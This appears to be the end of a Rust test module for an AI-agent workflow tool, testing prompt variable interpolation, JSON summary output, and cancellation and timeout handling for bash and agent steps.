        interpolate_vars(&mut wf, &vars);
        assert_eq!(wf.steps[0].prompt.as_ref().unwrap(), "do X then Y");
    }

    #[test]
    fn interpolate_vars_applies_to_every_step() {
        let mut wf = Workflow {
            name: "wf".into(),
            steps: vec![
                agent_step("a", "step a ${v}", "explore"),
                agent_step("b", "step b ${v}", "plan"),
            ],
            budget: None,
        };
        let mut vars = HashMap::new();
        vars.insert("v".to_string(), "VALUE".to_string());
        interpolate_vars(&mut wf, &vars);
        assert_eq!(wf.steps[0].prompt.as_ref().unwrap(), "step a VALUE");
        assert_eq!(wf.steps[1].prompt.as_ref().unwrap(), "step b VALUE");
    }

    #[test]
    fn interpolate_vars_repeated_token_in_same_prompt_is_replaced_each_time() {
        let mut wf = Workflow {
            name: "x".into(),
            steps: vec![agent_step("a", "${x} and ${x} again", "explore")],
            budget: None,
        };
        let mut vars = HashMap::new();
        vars.insert("x".to_string(), "V".to_string());
        interpolate_vars(&mut wf, &vars);
        assert_eq!(wf.steps[0].prompt.as_ref().unwrap(), "V and V again");
    }

    #[test]
    fn summary_to_json_sorts_step_names_alphabetically() {
        let mut summary = kf_workflow::WorkflowSummary {
            workflow_name: "wf".into(),
            outputs: std::collections::HashMap::new(),
            ..Default::default()
        };
        summary.outputs.insert(
            "zebra".into(),
            kf_workflow::StepOutput {
                name: "zebra".into(),
                kind: kf_workflow::StepKind::Agent,
                persona: "explore".into(),
                summary: "z summary".into(),
                critique: None,
                structured_output: None,
                run_id: None,
            },
        );
        summary.outputs.insert(
            "apple".into(),
            kf_workflow::StepOutput {
                name: "apple".into(),
                kind: kf_workflow::StepKind::Agent,
                persona: "plan".into(),
                summary: "a summary".into(),
                critique: None,
                structured_output: None,
                run_id: None,
            },
        );
        let json = summary_to_json(&summary);
        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed["workflow"], "wf");
        assert_eq!(parsed["steps"][0]["name"], "apple");
        assert_eq!(parsed["steps"][1]["name"], "zebra");
    }

    #[test]
    fn summary_to_json_includes_critique_field_when_present() {
        let mut summary = kf_workflow::WorkflowSummary {
            workflow_name: "wf".into(),
            outputs: std::collections::HashMap::new(),
            ..Default::default()
        };
        summary.outputs.insert(
            "s".into(),
            kf_workflow::StepOutput {
                name: "s".into(),
                kind: kf_workflow::StepKind::Agent,
                persona: "plan".into(),
                summary: "summary".into(),
                critique: Some("the critique".into()),
                structured_output: None,
                run_id: None,
            },
        );
        let json = summary_to_json(&summary);
        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed["steps"][0]["critique"], "the critique");
    }

    #[test]
    fn summary_to_json_critique_is_null_when_absent() {
        let mut summary = kf_workflow::WorkflowSummary {
            workflow_name: "wf".into(),
            outputs: std::collections::HashMap::new(),
            ..Default::default()
        };
        summary.outputs.insert(
            "s".into(),
            kf_workflow::StepOutput {
                name: "s".into(),
                kind: kf_workflow::StepKind::Agent,
                persona: "plan".into(),
                summary: "summary".into(),
                critique: None,
                structured_output: None,
                run_id: None,
            },
        );
        let json = summary_to_json(&summary);
        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
        assert!(parsed["steps"][0]["critique"].is_null(), "got: {parsed}");
    }

    #[test]
    fn summary_to_json_empty_outputs_returns_empty_array() {
        let summary = kf_workflow::WorkflowSummary {
            workflow_name: "wf".into(),
            outputs: std::collections::HashMap::new(),
            ..Default::default()
        };
        let json = summary_to_json(&summary);
        let parsed: serde_json::Value = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed["workflow"], "wf");
        assert!(parsed["steps"].as_array().unwrap().is_empty());
    }

    #[tokio::test]
    async fn empty_template_arg_is_failure() {
        let t = WorkflowTool::new(DenyList::default(), PathGuard::default(), false);
        let ctx = ToolContext::new();
        let out = t.run(&ctx, serde_json::json!({"template": "  "})).await;
        assert!(
            matches!(out, ToolOutcome::Failure(ToolError::InvalidArgs { .. })),
            "got {out:?}"
        );
    }

    #[tokio::test]
    async fn missing_template_key_is_failure() {
        let t = WorkflowTool::new(DenyList::default(), PathGuard::default(), false);
        let ctx = ToolContext::new();
        let out = t.run(&ctx, serde_json::json!({"vars": {"x": "y"}})).await;
        assert!(
            matches!(out, ToolOutcome::Failure(ToolError::InvalidArgs { .. })),
            "got {out:?}"
        );
    }

    #[tokio::test]
    async fn vars_with_non_string_values_are_filtered_out() {
        let t = WorkflowTool::new(DenyList::default(), PathGuard::default(), false);
        let ctx = ToolContext::new();
        let out = t
            .run(
                &ctx,
                serde_json::json!({
                    "template": "demo",
                    "vars": {"good": "str", "bad": 123, "alsobad": [1, 2]}
                }),
            )
            .await;
        assert!(matches!(out, ToolOutcome::Error { .. }), "got {out:?}");
    }

    #[tokio::test]
    async fn default_impl_produces_workflow_tool() {
        let tool = WorkflowTool::new(DenyList::default(), PathGuard::default(), false);
        assert_eq!(tool.def().name, "workflow_run");
    }

    // WO 43.26: a workflow bash step must honour the workflow cancel
    // token — a cancelled token aborts the spawn instead of hanging the
    // workflow. Bounded by an outer 10s wall: if the cancel path
    // regresses (the old `output().await` had no cancel select), the
    // test fails fast instead of hanging the suite for 30s.
    #[tokio::test]
    async fn run_bash_cancelled_token_returns_error_not_hang() {
        let spawner: Arc<dyn TaskSpawner> = Arc::new(EchoSpawner {
            calls: Arc::new(StdMutex::new(Vec::new())),
        });
        let cancel = CancellationToken::new();
        cancel.cancel();
        let runner = TaskSpawnerStepRunner {
            spawner,
            toolset: None,
            deny_list: DenyList::default(),
            path_guard: PathGuard::default(),
            bash_sandbox_workdir: false,
            sandbox_config: SandboxConfig::default(),
            landlock_extra_paths: Vec::new(),
            cancel_token: cancel,
            dry_run: false,
        };
        let result = tokio::time::timeout(
            std::time::Duration::from_secs(10),
            runner.run_bash("s", "sleep 60"),
        )
        .await;
        let err = match result {
            Ok(Err(e)) => e,
            Ok(Ok(_)) => panic!("cancelled bash step must error, not succeed"),
            Err(_) => panic!("run_bash hung past 10s — cancel token not honoured"),
        };
        assert!(
            err.to_string().contains("cancelled"),
            "error must name the cancellation, got: {err}"
        );
    }

    // WO 43.26 / WO 44.44: a stuck workflow bash step must hit the step
    // timeout, not hang until the executor's outer tool timeout. Bounded by
    // an outer 45s wall (timeout is 30s): if the timeout path regresses, the
    // test fails instead of hanging indefinitely. WO 44.44 item 4 un-gated
    // this test: the Windows Job Object wrap kills the whole `sh` tree on
    // timeout (KILL_ON_JOB_CLOSE), so the drain tasks see EOF and the
    // future resolves instead of deadlocking on the pipe held by an
    // orphaned grandchild.
    #[tokio::test]
    async fn run_bash_stuck_step_times_out() {
        let spawner: Arc<dyn TaskSpawner> = Arc::new(EchoSpawner {
            calls: Arc::new(StdMutex::new(Vec::new())),
        });
        let runner = TaskSpawnerStepRunner {
            spawner,
            toolset: None,
            deny_list: DenyList::default(),
            path_guard: PathGuard::default(),
            bash_sandbox_workdir: false,
            sandbox_config: SandboxConfig::default(),
            landlock_extra_paths: Vec::new(),
            cancel_token: CancellationToken::new(),
            dry_run: false,
        };
        let result = tokio::time::timeout(
            std::time::Duration::from_secs(45),
            runner.run_bash("s", "sleep 60"),
        )
        .await;
        let err = match result {
            Ok(Err(e)) => e,
            Ok(Ok(_)) => panic!("stuck bash step must error, not succeed"),
            Err(_) => panic!("run_bash hung past 45s — step timeout not honoured"),
        };
        assert!(
            err.to_string().contains("timed out"),
            "error must name the timeout, got: {err}"
        );
    }

    // WO 47.25: condition evals now spawn through the same
    // landlock+rlimit pre_exec as workflow bash steps. A benign condition
    /// must still evaluate true through that path — if the pre_exec sandbox
    /// broke the spawn, eval_condition would return false (spawn failure)
    /// and this test catches it.
    #[tokio::test]
    async fn eval_condition_benign_condition_true_through_sandbox() {
        let spawner: Arc<dyn TaskSpawner> = Arc::new(EchoSpawner {
            calls: Arc::new(StdMutex::new(Vec::new())),
        });
        let runner = TaskSpawnerStepRunner {
            spawner,
            toolset: None,
            deny_list: DenyList::default(),
            path_guard: PathGuard::default(),
            bash_sandbox_workdir: false,
            sandbox_config: SandboxConfig::default(),
            landlock_extra_paths: Vec::new(),
            cancel_token: CancellationToken::new(),
            dry_run: false,
        };
        assert!(runner.eval_condition("true").await);
    }

    /// Records the TaskCancel pair each run_task received (`None` when the
    /// request was uncancellable) and, when present, waits for the child
    /// token to fire — that wait is the WO 48.32 assertion surface: with
    /// the bridge missing the spawner returns instantly and the pair
    /// asserts in the tests below fail instead.
    struct CancelProbeSpawner {
        observed: Arc<StdMutex<Vec<Option<crate::tools::task::TaskCancel>>>>,
    }

    #[async_trait::async_trait]
    impl TaskSpawner for CancelProbeSpawner {
        async fn run_task(&self, request: TaskRequest) -> Result<String, String> {
            let Some(cancel) = request.cancel else {
                self.observed.lock().unwrap().push(None);
                return Ok("uncancellable".into());
            };
            tokio::time::timeout(Duration::from_secs(5), cancel.token.cancelled())
                .await
                .map_err(|_| "child cancel token never fired".to_string())?;
            self.observed.lock().unwrap().push(Some(cancel));
            Err("cancelled".into())
        }
    }

    fn assert_cancelled_pair(observed: &StdMutex<Vec<Option<crate::tools::task::TaskCancel>>>) {
        let observed = observed.lock().unwrap();
        let pair = observed[0]
            .as_ref()
            .expect("agent step must pass a TaskCancel, not None");
        assert!(pair.token.is_cancelled());
        assert!(pair.flag.load(std::sync::atomic::Ordering::SeqCst));
    }

    // WO 48.32: an agent step must receive a TaskCancel bridged from the
    // runner's token — a fired runner token (Esc / job timeout) cancels
    // the subagent. Pre-fix: cancel: None, the LLM loop kept spending.
    #[tokio::test]
    async fn agent_step_receives_cancelled_task_cancel_when_runner_token_fires() {
        let observed: Arc<StdMutex<Vec<Option<crate::tools::task::TaskCancel>>>> =
            Arc::new(StdMutex::new(Vec::new()));
        let spawner: Arc<dyn TaskSpawner> = Arc::new(CancelProbeSpawner {
            observed: observed.clone(),
        });
        let cancel = CancellationToken::new();
        cancel.cancel();
        let runner = TaskSpawnerStepRunner {
            spawner,
            toolset: None,
            deny_list: DenyList::default(),
            path_guard: PathGuard::default(),
            bash_sandbox_workdir: false,
            sandbox_config: SandboxConfig::default(),
            landlock_extra_paths: Vec::new(),
            cancel_token: cancel,
            dry_run: false,
        };
        let result = tokio::time::timeout(
            Duration::from_secs(10),
            runner.run_step("s", "work", "explore"),
        )
        .await;
        let err = match result {
            Ok(Err(e)) => e,
            Ok(Ok(_)) => panic!("agent step must fail once cancelled, not succeed"),
            Err(_) => panic!("run_step hung past 10s — runner token not bridged"),
        };
        assert!(
            err.to_string().contains("cancelled"),
            "error must name the cancellation, got: {err}"
        );
        assert_cancelled_pair(&observed);
    }

    // WO 48.32: the run_batch agent arm gets the same bridge as run_step.
    #[tokio::test]
    async fn batch_agent_step_receives_cancelled_task_cancel_when_runner_token_fires() {
        let observed: Arc<StdMutex<Vec<Option<crate::tools::task::TaskCancel>>>> =
            Arc::new(StdMutex::new(Vec::new()));
        let spawner: Arc<dyn TaskSpawner> = Arc::new(CancelProbeSpawner {
            observed: observed.clone(),
        });
        let cancel = CancellationToken::new();
        cancel.cancel();
        let runner = TaskSpawnerStepRunner {
            spawner,
            toolset: None,
            deny_list: DenyList::default(),
            path_guard: PathGuard::default(),
            bash_sandbox_workdir: false,
            sandbox_config: SandboxConfig::default(),
            landlock_extra_paths: Vec::new(),
            cancel_token: cancel,
            dry_run: false,
        };
        let req = kf_workflow::StepRequest {
            name: "s".into(),
            kind: kf_workflow::StepKind::Agent,
            prompt: "work".into(),
            persona: "explore".into(),
            command: String::new(),
            tool_name: String::new(),
            tool_arguments: serde_json::Value::Null,
            with_critique: false,
        };
        let result =
            tokio::time::timeout(Duration::from_secs(10), runner.run_batch(vec![req])).await;
        let err = match result {
            Ok(Err(e)) => e,
            Ok(Ok(_)) => panic!("agent batch step must fail once cancelled, not succeed"),
            Err(_) => panic!("run_batch hung past 10s — runner token not bridged"),
        };
        let batch = err
            .downcast_ref::<kf_workflow::BatchErrors>()
            .expect("batch failure must carry BatchErrors");
        assert!(
            batch.failures[0].1.to_string().contains("cancelled"),
            "step error must name the cancellation, got: {}",
            batch.failures[0].1
        );
        assert_cancelled_pair(&observed);
    }
}
